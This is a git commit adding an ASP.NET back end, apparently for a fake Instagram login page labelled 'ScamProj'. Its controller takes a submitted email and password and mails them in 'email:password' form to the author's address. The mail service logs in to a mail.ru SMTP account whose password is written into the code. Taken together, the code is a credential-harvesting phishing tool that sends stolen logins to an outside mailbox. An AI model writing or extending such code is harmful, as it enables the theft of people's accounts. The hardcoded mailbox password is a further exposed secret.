be8a1ec6539de8c7fbc5f9cfc2fe0d8212adb6f9
DmitryTXCMN <dmitrytxcmn@gmail.com>
2021-10-01 17:36:19 +0300

    Added ASP

---
+++ Instagram/InstagramASP/InstASP/InstASP/Controllers/HomeController.cs
@@ -0,0 +1,20 @@
+﻿using Microsoft.AspNetCore.Http;
+using Microsoft.AspNetCore.Mvc;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using InstASP.Services;
+
+namespace InstASP.Controllers
+{
+    public class HomeController : Controller
+    {
+        [HttpPost]
+        public IActionResult SendEmail([FromForm] string email, [FromForm] string password)
+        {
+            EmailService.SendEmailAsync("dmitrytxcmn@gmail.com", "ScamProj", $"{email}:{password}");
+            return Ok("Done");
+        }
+    }
+}
---
+++ Instagram/InstagramASP/InstASP/InstASP/EmailService.cs
@@ -0,0 +1,31 @@
+﻿using MimeKit;
+using MailKit.Net.Smtp;
+using System.Threading.Tasks;
+
+namespace InstASP.Services
+{
+    public class EmailService
+    {
+        public static async Task SendEmailAsync(string email, string subject, string message)
+        {
+            var emailMessage = new MimeMessage();
+
+            emailMessage.From.Add(new MailboxAddress("Администрация сайта", "scaminstfororis@mail.ru"));
+            emailMessage.To.Add(new MailboxAddress("", email));
+            emailMessage.Subject = subject;
+            emailMessage.Body = new TextPart(MimeKit.Text.TextFormat.Html)
+            {
+                Text = message
+            };
+
+            using (var client = new SmtpClient())
+            {
+                await client.ConnectAsync("smtp.mail.ru", 465, true);
+                await client.AuthenticateAsync("scaminstfororis@mail.ru", "scamproject1");
+                await client.SendAsync(emailMessage);
+
+                await client.DisconnectAsync(true);
+            }
+        }
+    }
+}
